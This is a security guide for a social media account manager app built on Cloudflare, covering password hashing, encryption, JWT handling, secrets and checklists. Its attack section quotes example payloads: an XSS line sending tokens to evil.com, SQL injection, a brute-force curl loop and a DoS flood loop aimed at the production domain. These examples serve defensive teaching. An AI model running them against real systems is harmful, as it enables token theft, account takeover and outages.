# Security & Best Practices

Panduan keamanan dan best practices untuk Social Media Account Manager.

## 🔐 Security Overview

### Password Security

#### User Passwords (Authentication)
- **Algorithm**: bcryptjs with 10 salt rounds
- **Storage**: Hashed in `users.password_hash`
- **Verification**: Constant-time comparison
- **Best Practice**: Never log or expose password hashes

```typescript
// Good
const hash = await bcrypt.hash(password, 10);

// Bad - too few rounds
const hash = await bcrypt.hash(password, 4);
```

#### Social Account Passwords
- **Algorithm**: AES-256-GCM (Web Crypto API)
- **Key**: Raw 32-byte key derived directly from `ENCRYPTION_KEY` (64 hex chars, 32 bytes)
- **IV**: Random 12 bytes per encryption, prepended
- **Auth Tag**: 16 bytes appended (validates integrity)
- **Storage**: Single Base64 blob: `base64( iv[12] || ciphertext || authTag[16] )`

```typescript
// Encryption format
const combined = iv(12) + ciphertext + authTag(16);
const encrypted = btoa(String.fromCharCode(...combined));

// Example
"7x8y9z0aAb1C..."
```

**Why separate encryption?**
- User passwords: One-way hash (bcrypt) - cannot decrypt
- Account passwords: Reversible encryption (AES-GCM) - can decrypt when needed

---

## 🛡️ JWT Token Security

### Token Structure

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "sub": "user_id",
    "email": "user@example.com",
    "name": "User Name",
    "iat": 1723006673,
    "exp": 1723611473
  }
}
```

### Token Lifecycle

1. **Generation**: After successful login/register
2. **Storage**: Client-side localStorage (`token`)
3. **Transmission**: `Authorization: Bearer <token>` header
4. **Verification**: Every protected API call
5. **Expiry**: 7 days from issue

> Note: localStorage is current trade-off, not secure storage. XSS hardening mandatory.

### Security Rules

✅ **DO:**
- Verify signature on every request
- Check expiration (`exp` claim)
- Use HTTPS in production
- Use strong JWT_SECRET (min 32 chars)
- Keep CSP strict
- Treat localStorage token as XSS-exposed

❌ **DON'T:**
- Store sensitive data in payload
- Use weak secrets
- Skip signature verification
- Extend expiry infinitely
- Share tokens between users
- Assume localStorage is safe

---

## 🚨 Common Attack Vectors & Mitigations

### 1. SQL Injection

**Attack:**
```sql
'; DROP TABLE users; --
```

**Mitigation:**
- ✅ Use Drizzle ORM (parameterized queries)
- ✅ Never concatenate user input into SQL
- ✅ Validate all inputs with Zod

**Example (Safe):**
```typescript
// Drizzle automatically parameterizes
const user = await db
  .select()
  .from(users)
  .where(eq(users.email, userInput)); // Safe
```

---

### 2. XSS (Cross-Site Scripting)

**Attack:**
```html
<script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>
```

**Mitigation:**
- ✅ React escapes content by default
- ✅ Never use `dangerouslySetInnerHTML` with user input
- ✅ Set CSP headers
- ✅ Sanitize user-generated content

**CSP Headers:**
```typescript
contentSecurityPolicy: {
  defaultSrc: ["'self'"],
  scriptSrc: ["'self'"],
  styleSrc: ["'self'", "'unsafe-inline'"], // Tailwind requires inline
}
```

---

### 3. CSRF (Cross-Site Request Forgery)

**Attack:**
```html
<img src="https://victim.com/api/projects?delete=all">
```

**Mitigation:**
- ✅ JWT in Authorization header (not cookies)
- ✅ SameSite cookies (if using cookies)
- ✅ Verify Origin header
- ✅ CSRF tokens not needed for Bearer auth

**Current Protection:**
- Token stored in localStorage
- Transmitted via header (not auto-sent like cookies)
- Attacker cannot read token due to same-origin policy

---

### 4. Brute Force (Login)

**Attack:**
```bash
# Try 1000 passwords
for pass in $(cat passwords.txt); do
  curl -X POST /api/auth/login -d "{\"email\":\"victim@example.com\",\"password\":\"$pass\"}"
done
```

**Mitigation:**
- ✅ Rate limiting: 10 attempts per 15 minutes per IP
- ✅ Bcrypt slows down verification (~300ms per attempt)
- ⚠️ Account lockout (planned)
- ⚠️ CAPTCHA (planned)

**Current Implementation:**
```typescript
// Rate limit map: IP -> [timestamp, count]
const rateLimitMap = new Map<string, [number, number]>();

// 10 requests per 15 minutes
if (count > 10) {
  return c.json({ error: 'Too many requests' }, 429);
}
```

---

### 5. Man-in-the-Middle (MITM)

**Attack:**
- Intercept HTTP traffic
- Read JWT tokens
- Steal passwords

**Mitigation:**
- ✅ Use HTTPS in production (Cloudflare auto-enforces)
- ✅ HSTS headers (Cloudflare auto-adds)
- ✅ No mixed content (all assets over HTTPS)

**Cloudflare Protection:**
- TLS 1.3
- Certificate auto-renewal
- HTTP → HTTPS redirect

---

### 6. Password Enumeration

**Attack:**
```bash
# Check if email exists
curl -X POST /api/auth/login -d '{"email":"test@example.com","password":"wrong"}'
# "Invalid credentials" → email may exist

curl -X POST /api/auth/register -d '{"email":"test@example.com",...}'
# "Email already exists" → confirms email
```

**Mitigation:**
- ✅ Generic error messages ("Invalid credentials")
- ⚠️ Rate limiting helps
- ⚠️ Timing attacks (bcrypt time varies - acceptable trade-off)

---

### 7. Session Hijacking

**Attack:**
- Steal JWT token via XSS/MITM
- Use token to impersonate user

**Mitigation:**
- ✅ HTTPS only
- ✅ Short token expiry (7 days)
- ⚠️ Refresh tokens (planned)
- ⚠️ Token revocation (planned; needs state store)

**Future Enhancement:**
```typescript
// Store refresh token in httpOnly cookie
// Short-lived access token (15 min)
// Long-lived refresh token (30 days)
```

---

### 8. Denial of Service (DoS)

**Attack:**
```bash
# Flood API with requests
while true; do
  curl https://social.bits.co.id/api/auth/login &
done
```

**Mitigation:**
- ✅ Cloudflare DDoS protection (automatic)
- ✅ Rate limiting on auth endpoints
- ✅ Workers CPU limit (prevents infinite loops)
- ✅ D1 query timeout

**Cloudflare Protection:**
- 100M+ requests/second capacity
- Challenge suspicious traffic
- Geographic blocking

---

## 🔒 Data Protection

### Encryption at Rest

| Data Type | Storage | Encryption |
|-----------|---------|------------|
| User passwords | D1 SQLite | bcrypt hash (irreversible) |
| Account passwords | D1 SQLite | AES-256-GCM (reversible) |
| JWT tokens | Client localStorage | Signed (HS256) |
| Database files | Cloudflare D1 | Encrypted at rest (Cloudflare) |

### Encryption in Transit

- **Client ↔ Cloudflare**: TLS 1.3
- **Cloudflare ↔ Worker**: Internal (encrypted)
- **Worker ↔ D1**: Internal (encrypted)

---

## 🔑 Secret Management

### Required Secrets

1. **JWT_SECRET**
   - Purpose: Sign and verify JWT tokens
   - Length: Min 32 characters
   - Generate:
     ```bash
     node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"
     ```

2. **ENCRYPTION_KEY**
   - Purpose: Encrypt social account passwords
   - Length: Exactly 64 hex characters (32 bytes)
   - Generate:
     ```bash
     node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
     ```

### Setting Secrets

```bash
# Production (recommended)
wrangler secret put JWT_SECRET
wrangler secret put ENCRYPTION_KEY

# Local dev (wrangler.toml [vars])
# Use dummy values, override with real secrets in production
```

### Secret Rotation

**If ENCRYPTION_KEY is compromised:**

1. Generate new key
2. Decrypt all account passwords with old key
3. Re-encrypt with new key
4. Update ENCRYPTION_KEY secret

**Script (TODO):**
```bash
npm run rotate-encryption-key
```

---

## 🧪 Security Testing

### Manual Tests

```bash
# 1. SQL Injection
curl -X POST /api/auth/login \
  -d '{"email":"admin'\'' OR 1=1--","password":"any"}'
# Should: 401 Invalid credentials

# 2. XSS
curl -X POST /api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"<script>alert(1)</script>"}'
# Should: Create project with escaped name

# 3. Rate limiting
for i in {1..15}; do
  curl -X POST /api/auth/login -d '{"email":"test@test.com","password":"wrong"}'
done
# Should: 429 after 10 attempts

# 4. Auth bypass
curl /api/projects
# Should: 401 Unauthorized

# 5. CSRF
curl -X DELETE /api/projects/xyz123
# Should: 401 (no token)
```

### Automated Security Scan

```bash
# npm audit
npm audit --production

# Snyk
npx snyk test

# OWASP ZAP (TODO)
# Point ZAP proxy to http://localhost:5173
```

---

## 🚀 Production Security Checklist

### Pre-Deployment

- [ ] Set JWT_SECRET in Cloudflare Secrets
- [ ] Set ENCRYPTION_KEY in Cloudflare Secrets
- [ ] Update CORS origin to production domain
- [ ] Enable HTTPS only (Cloudflare auto)
- [ ] Remove debug logs
- [ ] Run `npm audit --production`
- [ ] Test rate limiting
- [ ] Verify token expiration works

### Post-Deployment

- [ ] Test login flow in production
- [ ] Verify HTTPS certificate
- [ ] Check CSP headers
- [ ] Enable Cloudflare WAF
- [ ] Set up monitoring/alerts
- [ ] Test account password encryption/decryption
- [ ] Verify rate limiting in production

### Ongoing

- [ ] Rotate JWT_SECRET every 90 days
- [ ] Monitor failed login attempts
- [ ] Review audit logs weekly
- [ ] Update dependencies monthly
- [ ] Security scan quarterly

---

## 📊 Security Headers (Current)

```
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Hono `secureHeaders()` middleware handles these automatically.**

---

## 🐛 Vulnerability Disclosure

If you find a security issue:

1. **DO NOT** open public GitHub issue
2. Email: security@bits.co.id
3. Include:
   - Vulnerability description
   - Steps to reproduce
   - Impact assessment
4. Allow 90 days for fix before public disclosure

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [JWT Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)
- [Cloudflare Security](https://www.cloudflare.com/learning/security/)
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)

---

## 🔮 Future Security Enhancements

1. **2FA (TOTP)**
   - OTP generation with `otplib`
   - QR code for authenticator apps

2. **Refresh Tokens**
   - Short-lived access tokens (15 min)
   - Long-lived refresh tokens (30 days)
   - Store in httpOnly cookies

3. **Session Management**
   - Multi-device session tracking
   - Remote logout
   - Active sessions list

4. **Audit Logs**
   - Track all CRUD operations
   - IP address logging
   - Suspicious activity alerts

5. **Password Policies**
   - Minimum complexity requirements
   - Password history
   - Expiration (enterprise)

6. **Account Lockout**
   - Lock after 5 failed attempts
   - Unlock via email verification

7. **Email Verification**
   - Verify email on registration
   - Password reset flow

8. **API Key Management**
   - Generate API keys for external integrations
   - Scoped permissions

---

## Status

| Area | Status |
|------|--------|
| Password hashing | implemented |
| Account password encryption | implemented |
| JWT auth | implemented |
| Rate limiting | implemented |
| CSP headers | planned |
| Refresh tokens | planned |
| Token revocation | planned |
| Account lockout | planned |
| CAPTCHA | planned |
| Audit logs | planned |

**Current Security Grade: B+**

Strong foundation with bcrypt, AES-256, JWT, rate limiting, and Cloudflare protection. Room for improvement with 2FA, refresh tokens, and audit logging.
